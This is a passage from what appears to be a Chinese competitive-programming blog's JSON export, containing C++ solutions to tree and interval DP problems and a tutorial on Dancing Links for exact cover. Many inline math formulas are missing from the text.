的根的分数。\n若某个子树为空，规定其加分为 ，叶子的加分就是叶节点本身的分数。不考虑它的空子树。\n试求一棵符合中序遍历为  且加分最高的二叉树 。要求输出\n\n 的最高加分。\n 的前序遍历。\n\n\n    \n  \n\n\n    Solution \n    \n      二叉树的中序遍历就是这棵树从左往右看的顺序, 而且它有这样的性质:\n可以用区间  描述一棵子树, 这棵子树的 “最左边的点” 就是  , “最右边的点” 就是  .\n此外, 根节点也必定在  , 我们不妨设根节点为  .\n那么, 对于以  为根的子树, 它的左子树的区间就为  , 它的右子树的区间就为  . ( 或  表示相应的子树为空.)\n同时, 容易发现子树的分数只对  有直接贡献, 因此我们可以设  表示子树  的分数, 根据题意, 有如下转移方程:\n\n初始时有  , 答案即为  .\n而题目还要求给出最优树的先序遍历, 这个也简单, 可以用数组  记录区间  的根节点, 在转移的时候一起更新  即可.\n别忘了初始时有  .\nAC Code:\n/*    f[l][r]: max subtree of [l, r]    f[l][r] = max {f[l][k-1] * f[k+1][r] + f[k][k], k∈[l, r]}    init():        f[i][i] = t[i]        root[i][i] = i*/#include &lt;cstdio&gt;#include &lt;iostream&gt;#define N 31int n;int d[N];int root[N][N];long long f[N][N];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}long long dfs(int l, int r){    if(l == r) return d[l];    if(f[l][r]) return f[l][r];    if(l &gt; r) return 1; // 空子树加分为 1    for(int i = l; i &lt;= r; ++i){ // 枚举可能的根        long long res = dfs(l, i - 1) * dfs(i + 1, r) + f[i][i];        if(res &gt; f[l][r]){            f[l][r] = res;            root[l][r] = i;        }    }    return f[l][r];}void print(int l, int r){    // 根 - 左 - 右    if(l &gt; r) return;    printf(\"%d \", root[l][r]);    print(l, root[l][r] - 1);    print(root[l][r] + 1, r);}int main(){    n = read();    for(int i = 1; i &lt;= n; ++i) d[i] = read(), f[i][i] = d[i], root[i][i] = i;    printf(\"%lld\\n\", dfs(1, n));    print(1, n);    return 0^(0-0)^0;}\n\n    \n  \n\n\n17. 树形DP之树的最长路径\n  \n    \n      题意简述\n\n    \n    \n      给定一棵树, 包含  个节点和  条带权无向边, 求树的最长路.\n\n    \n  \n\n\n    Solution \n    \n      对于以  为根的子树, 如果这个子树有部分属于最长路, 那么  一定在最长路上, 而且:\n\n 的所有子树中的最长链必定属于最长路.\n 的所有子树中的次长链可能属于最长路. (因为最长路也可能往  的父亲方向走)\n\n那么, 就可以以函数 dfs(x) 表示以  为根的子树的最长链的权值和, 从根节点往下搜, 每次都递归求出最长链和次长链, 并更新全局最长链长度, 最后返回该子树的最长链即可.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;iostream&gt;#define N 10004int n, tot;int ans;int ver[N &lt;&lt; 1], edge[N &lt;&lt; 1], nxt[N &lt;&lt; 1], head[N];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch ^ 48);    return f ? x : -x;}void add(int x, int y, int z){\tver[++tot] = y, edge[tot] = z, nxt[tot] = head[x], head[x] = tot;}int max(int a, int b){return a &gt; b? a : b;}int dfs(int x, int fa){\tint d1 = 0, d2 = 0;\tfor(int i = head[x]; i; i = nxt[i]){\t\tint y = ver[i]; if(y == fa) continue;\t\tint d = dfs(y, x) + edge[i];\t\tif(d &gt;= d1) d2 = d1, d1 = d;\t\telse if(d &gt; d2) d2 = d;\t}\tans = max(ans, d1 + d2);\treturn d1;}int main(){\tn = read();\tfor(int i = 1; i &lt; n; ++i){\t\tint u = read(), v = read(), w = read();\t\tadd(u, v, w); add(v, u, w);\t}\tdfs(1, 0);\tprintf(\"%d\\n\", ans);}\n\n    \n  \n\n\n18. 没有上司的舞会\n  \n    \n      题意简述\n\n    \n    \n      某大学有  个职员，编号为 。\n他们之间有从属关系，也就是说他们的关系就像一棵以校长为根的树，父结点就是子结点的直接上司。\n现在有个周年庆宴会，宴会每邀请来一个职员都会增加一定的快乐指数 ，但是呢，如果某个职员的直接上司来参加舞会了，那么这个职员就无论如何也不肯来参加舞会了。\n所以，请你编程计算，邀请哪些职员可以使快乐指数最大，求最大的快乐指数。\n\n    \n  \n\n\n    Solution \n    \n      \n以 f[x][0] 表示 x 不参加的情况下, 以 x 为根的子树的最大快乐指数\n以 f[x][1] 表示 x 参加的情况下, 以 x 为根的子树的最大快乐指数\n\n显然有如下转移方程:\n\n初始条件: .答案: \nAC Code:\n#include &lt;cstdio&gt;#include &lt;iostream&gt;#define N 6005int n, tot, ans;int a[N], f[N][2];int ver[N], nxt[N], head[N], in[N];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch ^ 48);    return f ? x : -x;}void add(int x, int y){\tver[++tot] = y, ++in[y], nxt[tot] = head[x], head[x] = tot;}int max(int a, int b){return a &gt; b ? a : b;}void dfs(int x, int fa){\tfor(int i = head[x]; i; i = nxt[i]){\t\tint y = ver[i]; if(y == fa) continue;\t\tdfs(y, x);\t\tf[x][1] += f[y][0];\t\tf[x][0] += max(f[y][0], f[y][1]);\t}}int main(){\tn = read();\tfor(int i = 1; i &lt;= n; ++i) a[i] = read(), f[i][1] = a[i];\tfor(int i = 1; i &lt; n; ++i){\t\tint u = read();/* add(u, read()); */\t\tadd(read(), u);\t}\tfor(int i = 1; i &lt;= n; ++i){\t\tif(!in[i]){\t\t\tdfs(i, 0);\t\t\treturn printf(\"%d\\n\", max(f[i][0], f[i][1])) &amp; 0;\t\t}\t}}\n\n    \n  ","categories":["算法"]},{"title":"算法学习笔记 -- Dancing Links","url":"/2025/07/01/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Dancing-Links/","content":"前言在爆搜数独题 TLE 之后, 得知了基于 Dancing Links 的 X Algorithm, 感觉非常有意思, 遂记录之.\n论文出处: arXiv:cs/0011047\n参考资料: OI Wiki\n网上一搜一大把相关内容.\n问题引入\n  \n    \n      洛谷P4929\n\n    \n    \n      给定一个  行  列的矩阵，矩阵中每个元素要么是 ，要么是 。\n你需要在矩阵中挑选出若干行，使得对于矩阵的每一列 ，在你挑选的这些行中，有且仅有一行的第  个元素为 。\n输出顺序任意, 若无解，输出 No Solution!。\n数据范围: ,保证矩阵中  的数量不超过  个。\n\n    \n  \n\n思路很容易想到这样的深搜做法 (也很符合正常人的思维):\n\n\n对于其中一列 , 枚举这一列含 1 的每一行 , 并假设我选择了 , 显然  可能不止在列  上含有 1, 我就再遍历  的每一列含 1 的行 , 把  删掉. (删掉表示这一列已经有 1 了, 不能再选了)\n\n\n\n删了 , 就接着往下搜 (考虑其它列).\n\n\n\n接着考虑回溯, 也就是恢复我们刚刚删掉的行, 再去考虑选其它行.\n\n\n\n终止条件为: 搜索到最后所有行都删完了 (无冲突, 有解), 或者发现到最后有删不掉的行 (有冲突, 无解).\n\n\n\n显然, 每层搜索中列  是必删的. 那么应该如何选择列  呢? 是不是随便选一列就行?\n当然可以, 但如果我们每次都选择含 1 最少的列作为列 , 那么搜索的分支就最少, 效率也会大大提高. (启发式搜索)\n思路有了, 问题在于如何高效地实现这个 删除 与 恢复 操作.\nDancing Links 的引入于是, 大牛 Donald E. Knuth 就联想到了双向链表的删除操作:\n// 假设 p 的前驱为 left, 后继为 right, 且都不为空void remove(Node* p){    p-&gt;left-&gt;right = p-&gt;right;    p-&gt;right-&gt;left = p-&gt;left; // 这两行是把 p 的前驱和后继直接相连    delete p; // 然后删除 p ?}\n\n但实际上, 如果我们不删除掉  的话, 我们就可以通过:\nvoid recover(Node* p){    // 在删除操作中, 我们仅分别改变了 p-&gt;left 和 p-&gt;right 这两个结点的后继和前驱,    // 实际上, p-&gt;left 和 p-&gt;right 仍然指向原来的位置.    p-&gt;left-&gt;right = p;    p-&gt;right-&gt;left = p; // 这样就成功把 p 插入到 p-&gt;left 和 p-&gt;right 之间了!}\n\n哎! 那不就可以利用这个, 实现我们想要的 删除 与 恢复 操作了吗?\n再回头看看我们的需求:\n\n选中一列 (选择处理一个约束), 遍历这个列中含 1 的每一行:\n对于每个元素, 既能在行上遍历, 也能在列上遍历, 也就是说它得是个 十字形链表.\n\n\n我们知道链表的遍历是朝一个方向进行的, 如果从节点  往后遍历, 要如何遍历到它的前驱  呢?\n最简单的解决方式, 就是让这个链表是 双向环状 的, 把链表第一个元素和最后一个元素相连.\n\n\n\nOK, 现在我们选择了 双向十字循环链表 作为我们的辅助数据结构, 那这个 链表 应该如何构造?\nDancing Links 的构造build不难想到, 我们可以先创造一行  个元素, 每个元素  表示第  列的头节点, 然后把这  个元素在水平方向上串起来, 也就是说, 我们先创建了一个像这样的表格的 固定表头 (第一行):\n\n\n\n0\n1\n2\n…\nm\n\n\n\n无\n|\n|\n…\n|\n\n\n无\n\n|\n…\n|\n\n\n无\n|\n|\n…\n\n\n\n无\n|\n\n…\n|\n\n\n或者看这张图, 更直观. (图片来源于网络)\n\nwait, 不是说创造  个元素吗? 为什么有第  列?\n这个第  列的设计相当巧妙, 初始时,  的 left 为  , right 为  . 随着删除的进行, 始终保持有  的 right 为第一个待删除的列, 且当所有列都删完时有  的 left 和 right 都指向自己 (), 可以方便地判断是否已经删完.\n于是就可以给出 build 函数了:\nstruct DLX{    int n, m, tot;     // n 行, m 列, 已经创建了 tot 个节点\tint size[MAX_C + 1]; // 指示每列的节点数 (不含头节点)\tint up[SIZE], down[SIZE], left[SIZE], right[SIZE];    // 编号为 i 的节点的上、下、左、右的节点编号    // 创建一个 r 行 c 列的表, 初始化其列表头    void build(const int &amp;r, const int &amp;c){        n = r, m = c;        for(int i = 0; i &lt;= c; ++i){ // 令表头在总节点的编号中为 0~c            left[i] = i - 1, right[i] = i + 1;            up[i] = down[i] = i;        }        left[0] = c, right[c] = 0; // 0号节点要特殊处理        tot = c; // tot 指示最后一个被创建的节点的编号        memset(size, 0, sizeof(size)); // 给列大小 清零    }};    \n\n创建完列表头了, 接下来就要思考如何往第  行, 第  列插入节点.\ninsertwait, 我们只创建了列表头, 行表头去哪了?\n嗯, 我们不需要固定的行表头.\n别忘了我们的目标, 我们只需要能够遍历第  行的所有节点就行了, 由于行链表是双向环状的, 我们只需要找到第  行的一个节点就能遍历整个行. 换言之, 第  行的每个点都能成为 “头节点”, 不妨取第一个插入进  行的元素为这个“头节点”, 我们将之称为 哨兵节点, 用 first[r] 表示.\n现在我们来思考如何向第  行, 第  列插入节点.\n先说往第  列插入, 这个简单, 只需要在第  列的头节点下面插入即可, 是简单的链表插入.\n// 新建一个节点, 把它插入到第 c 列的头节点的后面++tot;// ++tot 是新节点的编号, 而 c 就是第 c 列的头节点的编号down[tot] = down[c], up[tot] = c;up[down[c]] = tot, down[c] = tot;\n\n再说往第  行插入, 这个需要分类讨论:\n\n如果第  行还没有节点, 那么这个新的节点就要成为这一行的头节点:\n\n// first[r] 及其前驱后继都是 totif(!first[r]) first[r] = left[tot] = right[tot] = tot;\n\n\n如果第  行已经有节点了, 那就和插入到  列一样, 把它插入到哨兵节点的右边:\n\nif(first[r]){    left[tot] = first[r];    right[tot] = right[first[r]];    left[right[first[r]]] = tot;    right[first[r]] = tot;}\n\n整合一下, 得到 insert 函数:\nstruct DLX{    int n, m, tot;    int col[SIZE], raw[SIZE]; // 编号为 i 的节点的列编号, 行编号\tint first[MAX_R + 1];     // 第 i 行的哨兵节点    int size[MAX_C + 1];\tint up[SIZE], down[SIZE], left[SIZE], right[SIZE];    void insert(const int &amp;r, const int &amp;c){        // 新建节点, 标记其行列, 记得给第 c 列的节点数加 1        raw[++tot] = r, col[tot] = c, ++size[c];        // 往 c 列的头节点的下面插入        down[tot] = down[c], up[tot] = c;        up[down[c]] = tot, down[c] = tot;        // 如果 r 行还没有节点, 就成为 r 行的第一个节点        if(!first[r]) first[r] = left[tot] = right[tot] = tot;        // 否则插入到 r 行的哨兵节点的右边        else{            left[tot] = first[r];            right[tot] = right[first[r]];            left[right[first[r]]] = tot;            right[first[r]] = tot;        }    }};\n\nremove &amp; recoverbuild 和 insert 应该是最难理解的部分了, 接下来就是实现删除、恢复第  列的 remove 和 recover 函数, 直接看代码和注释就懂了.\nstruct DLX{    int n, m, tot;    int col[SIZE], raw[SIZE];\tint first[MAX_R + 1], size[MAX_C + 1];\tint up[SIZE], down[SIZE], left[SIZE], right[SIZE];    void remove(const int &amp;c){        // \"删掉\"第 c 列的表头节点        right[left[c]] = right[c], left[right[c]] = left[c];        // 接下来往下遍历第 c 列的所有元素 (其实往上也行, 环嘛, 都一样)        for(int i = down[c]; i != c; i = down[i]){            // 删掉在第 c 列的节点 i 的所在行, 因为这一行不可能进入决策了            // 遍历 i 所在行的元素 j, 把 up[j] 和 down[j] 连起来            for(int j = right[i]; j != i; j = right[j]){                down[up[j]] = down[j], up[down[j]] = up[j];                --size[col[j]]; // 别忘了: j 所在列的节点数要减 1            }        }    }    void recover(const int &amp;c){        // 和 remove 完全相反的操作        for(int i = up[c]; i != c; i = up[i]){            for(int j = left[i]; j != i; j = left[j]){                down[up[j]] = up[down[j]] = j, ++size[col[j]];            }        }        // 恢复第 c 列的表头节点        right[left[c]] = left[right[c]] = c;    }};\n\nLet’s dance!接下来, 就可以实现 dfs 了, 也就是 dance 函数.\n思路在最开始就讲了, 所以直接上代码.\nint stackl[MAX_R + 1]; // 记录选择的行struct DLX{    // ... 其它部分    bool dance(int step){ // step 表示已经删了几行        if(!right[0]){    // 0 号节点的 right 指针指向自己, 说明已经删完了            for(int i = 0; i &lt; step; ++i)                printf(\"%d \", stack[i]);            return true; // 直接输出选中的行, 并返回 true 表示找到解        }        // 启发式搜索: 选择删掉 size 最小的列 c        int c = right[0];        for(int i = right[0]; i; i = right[i]){            if(size[i] &lt; size[c]) c = i;        }        // 这句话的意思是, 没有行能够满足列 c了, 因此目前的方案不可行.        if(size[c] == 0) return false;        // 删掉列 c, 并遍历在列 c 上的行, 删掉它们的列        remove(c);        for(int i = down[c]; i != c; i = down[i]){            stack[step] = raw[i]; // 为了删掉列 c, 我们选择这一行, 删掉其它行            for(int j = right[i]; j != i; j = right[j]) remove(col[j]);            if(dance(step + 1)) return true; // 递归往下搜, 有解了就返回 true            for(int j = left[i]; j != i; j = left[j]) recover(col[j]); // 回溯        }        recover(c); // 回溯        return false; // 能执行到这里, 就说明目前的方案不可行.    }};\n\n其它上面没提的事项\n因为我们只关心 1, 不关心 0, 所以我们只插入 1 节点.\n既然只插入 1 节点, 那么 SIZE 就是 1 的数量.\nMAX_C 表示约束的数量, MAX_R 表示可选择的方案数.\n因此, 可以把某些问题 (如数独) 转化为  精确覆盖问题, 然后用 DLX 解决.\n\n完整模板#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;const int MAX_C = 501;const int MAX_R = 501;const int SIZE = MAX_C + 5001;int stack[SIZE];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}struct DLX{    int n, m, tot;    int col[SIZE], raw[SIZE];\tint first[MAX_R + 1], size[MAX_C + 1];\tint up[SIZE], down[SIZE], left[SIZE], right[SIZE];    void build(const int &amp;r, const int &amp;c){        n = r, m = c;        for(int i = 0; i &lt;= c; ++i){            left[i] = i - 1, right[i] = i + 1;            up[i] = down[i] = i;        }        left[0] = c, right[c] = 0;        tot = c;        memset(size, 0, sizeof(size));    }    void remove(const int &amp;c){        right[left[c]] = right[c], left[right[c]] = left[c];        for(int i = down[c]; i != c; i = down[i]){            for(int j = right[i]; j != i; j = right[j]){                down[up[j]] = down[j], up[down[j]] = up[j];                --size[col[j]];            }        }    }    void recover(const int &amp;c){        for(int i = up[c]; i != c; i = up[i]){            for(int j = left[i]; j != i; j = left[j]){                down[up[j]] = up[down[j]] = j, ++size[col[j]];            }        }        right[left[c]] = left[right[c]] = c;    }    void insert(const int &amp;r, const int &amp;c){        raw[++tot] = r, col[tot] = c, ++size[c];        down[tot] = down[c], up[tot] = c;        up[down[c]] = tot, down[c] = tot;        if(!first[r]) first[r] = left[tot] = right[tot] = tot;        else{            left[tot] = first[r];            right[tot] = right[first[r]];            left[right[first[r]]] = tot;            right[first[r]] = tot;        }    }    bool dance(int step){        if(!right[0]){            for(int i = 0; i &lt; step; ++i)                printf(\"%d \", stack[i]);            return true;        }        int c = right[0];        for(int i = right[0]; i; i = right[i]){            if(size[i] &lt; size[c]) c = i;        }        if(size[c] == 0) return false;        remove(c);        for(int i = down[c]; i != c; i = down[i]){            stack[step] = raw[i];            for(int j = right[i]; j != i; j = right[j]) remove(col[j]);            if(dance(step + 1)) return true;            for(int j = left[i]; j != i; j = left[j]) recover(col[j]);        }        recover(c);        return false;    }}solver;int main(){    int n, m;    n = read(), m = read();    solver.build(n, m);    for(int i = 1; i &lt;= n; ++i){        for(int j = 1; j &lt;= m; ++j){            int x = read();            if(x) solver.insert(i, j);        }    }    if(!solver.dance(0)) puts(\"No Solution!\");}","categories":["算法"],"tags":["Dangcing Links"]}]